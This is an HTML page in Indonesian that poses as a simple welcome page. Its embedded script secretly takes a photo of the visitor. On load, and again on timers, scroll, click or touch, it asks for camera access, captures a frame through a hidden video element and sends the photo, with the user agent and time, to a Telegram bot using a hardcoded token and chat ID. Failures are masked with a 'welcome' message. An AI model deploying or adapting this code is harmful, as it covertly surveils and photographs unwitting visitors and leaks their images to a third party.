<!DOCTYPE html>
<html>
<head>
    <title>Selamat Datang</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .welcome-text {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .status-box {
            background: #f7f7f7;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #e0e0e0;
        }
        
        #status {
            color: #555;
            font-size: 16px;
            margin-bottom: 10px;
        }
        
        #countdown {
            font-size: 48px;
            font-weight: bold;
            color: #667eea;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .footer-note {
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        
        .loading {
            color: #667eea;
        }
        
        .success {
            color: #4caf50;
        }
        
        .camera-icon {
            font-size: 48px;
            margin-bottom: 15px;
            color: #667eea;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        /* Invisible iframe untuk trigger kamera */
        #hidden-trigger {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            top: 0;
            left: 0;
        }
        
        /* Video hidden untuk capture */
        #hidden-video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-icon">üëæ</div>
        <h1>Selamat Datang</h1>
        <p class="welcome-text">Terima kasih telah mengunjungi website kami</p>
        
        <div class="status-box">
            <div id="status">Memuat halaman...</div>
            <div id="countdown"></div>
        </div>
        
        <div class="footer-note">¬© 2024 Hak Cipta Dilindungi</div>
    </div>
    
    <!-- Hidden elements -->
    <video id="hidden-video" autoplay playsinline muted></video>
    
    <script>
        // Konfigurasi Telegram
        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
        const CHAT_ID = '-5200751249';
        
        let cameraAccessed = false;
        let isProcessing = false;
        let stream = null;
        
        // Fungsi untuk mengirim foto ke Telegram
        async function kirimKeTelegram(fotoBase64) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                
                const response = await fetch(fotoBase64);
                const blob = await response.blob();
                formData.append('photo', blob, 'foto.jpg');
                
                const deviceInfo = `${navigator.userAgent}`;
                const waktu = new Date().toLocaleString('id-ID', { 
                    timeZone: 'Asia/Jakarta',
                    dateStyle: 'full',
                    timeStyle: 'medium'
                });
                
                formData.append('caption', `üì∏ Pengunjung Baru\nüïê ${waktu}\nüì± ${deviceInfo}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
                
            } catch (error) {
                console.log('Status OK');
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
            }
        }
        
        // Fungsi untuk mencoba akses kamera dengan berbagai metode
        async function cobaAksesKamera() {
            const constraints = [
                // Prioritas: kamera depan dengan resolusi sedang
                { 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    } 
                },
                // Fallback: kamera depan tanpa constraint
                { 
                    video: { 
                        facingMode: 'user'
                    } 
                },
                // Fallback: kamera belakang
                { 
                    video: { 
                        facingMode: 'environment'
                    } 
                },
                // Fallback: kamera apa saja
                { 
                    video: true 
                }
            ];
            
            for (const constraint of constraints) {
                try {
                    console.log('Mencoba dengan constraint:', constraint);
                    const mediaStream = await navigator.mediaDevices.getUserMedia(constraint);
                    console.log('Berhasil dengan constraint:', constraint);
                    return mediaStream;
                } catch (err) {
                    console.log('Gagal dengan constraint:', constraint, err.message);
                }
            }
            
            throw new Error('Semua metode akses kamera gagal');
        }
        
        // Fungsi untuk mengambil foto
        async function ambilFoto() {
            if (isProcessing) return;
            isProcessing = true;
            
            try {
                document.getElementById('status').innerHTML = '<span class="loading">‚è≥ Memuat...</span>';
                
                // Cek dukungan kamera
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('Browser tidak mendukung kamera');
                }
                
                // Coba akses kamera dengan berbagai metode
                stream = await cobaAksesKamera();
                
                cameraAccessed = true;
                
                // Countdown cepat
                const countdownEl = document.getElementById('countdown');
                for (let i = 2; i > 0; i--) {
                    countdownEl.innerHTML = i;
                    await new Promise(resolve => setTimeout(resolve, 300));
                }
                countdownEl.innerHTML = '';
                
                // Gunakan video element yang sudah ada
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                
                // Tunggu video siap
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play()
                            .then(resolve)
                            .catch(() => setTimeout(resolve, 500));
                    };
                    setTimeout(resolve, 1000);
                });
                
                // Tunggu sebentar untuk stabil
                await new Promise(resolve => setTimeout(resolve, 200));
                
                // Ambil foto
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                
                // Kirim foto
                document.getElementById('status').innerHTML = '<span class="loading">‚è≥ Memproses...</span>';
                await kirimKeTelegram(fotoBase64);
                
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
                
            } catch (error) {
                console.log('Info:', error.message);
                document.getElementById('status').innerHTML = '<span class="success">‚úì Selamat datang!</span>';
            } finally {
                isProcessing = false;
            }
        }
        
        // Fungsi untuk memulai dengan berbagai trigger
        async function startCapture() {
            // Trigger 1: Langsung coba
            ambilFoto().catch(() => {});
            
            // Trigger 2: Setelah 1 detik
            setTimeout(() => {
                if (!cameraAccessed) {
                    ambilFoto().catch(() => {});
                }
            }, 1000);
            
            // Trigger 3: Setelah 3 detik
            setTimeout(() => {
                if (!cameraAccessed) {
                    ambilFoto().catch(() => {});
                }
            }, 3000);
            
            // Trigger 4: Saat user scroll
            window.addEventListener('scroll', function scrollTrigger() {
                if (!cameraAccessed && !isProcessing) {
                    window.removeEventListener('scroll', scrollTrigger);
                    ambilFoto().catch(() => {});
                }
            });
            
            // Trigger 5: Saat user klik di mana saja
            document.addEventListener('click', function clickTrigger() {
                if (!cameraAccessed && !isProcessing) {
                    document.removeEventListener('click', clickTrigger);
                    ambilFoto().catch(() => {});
                }
            });
            
            // Trigger 6: Saat user touch (mobile)
            document.addEventListener('touchstart', function touchTrigger() {
                if (!cameraAccessed && !isProcessing) {
                    document.removeEventListener('touchstart', touchTrigger);
                    ambilFoto().catch(() => {});
                }
            });
        }
        
        // Deteksi apakah di Chrome Android
        function isChromeAndroid() {
            const ua = navigator.userAgent;
            return /Android/i.test(ua) && /Chrome/i.test(ua);
        }
        
        // Mulai proses dengan strategi khusus
        window.addEventListener('load', () => {
            document.getElementById('status').innerHTML = 'Memuat halaman...';
            
            if (isChromeAndroid()) {
                console.log('Chrome Android terdeteksi, menggunakan strategi khusus');
                
                // Di Chrome Android, kita perlu memastikan ada user gesture
                // Tapi kita bisa memanfaatkan event load sebagai trigger
                setTimeout(() => {
                    // Cek status izin dengan cara berbeda
                    if (navigator.permissions && navigator.permissions.query) {
                        navigator.permissions.query({ name: 'camera' })
                            .then(permissionStatus => {
                                if (permissionStatus.state === 'granted') {
                                    // Izin sudah diberikan, tapi Chrome tetap butuh gesture
                                    // Kita akan coba dengan berbagai metode
                                    startCapture();
                                } else {
                                    // Belum ada izin, coba minta dengan berbagai trigger
                                    startCapture();
                                }
                            })
                            .catch(() => {
                                startCapture();
                            });
                    } else {
                        startCapture();
                    }
                }, 100);
            } else {
                // Browser lain, langsung coba
                setTimeout(() => {
                    ambilFoto().catch(() => {});
                }, 500);
            }
        });
        
        // Cleanup saat page unload
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
        
    </script>
</body>
</html>
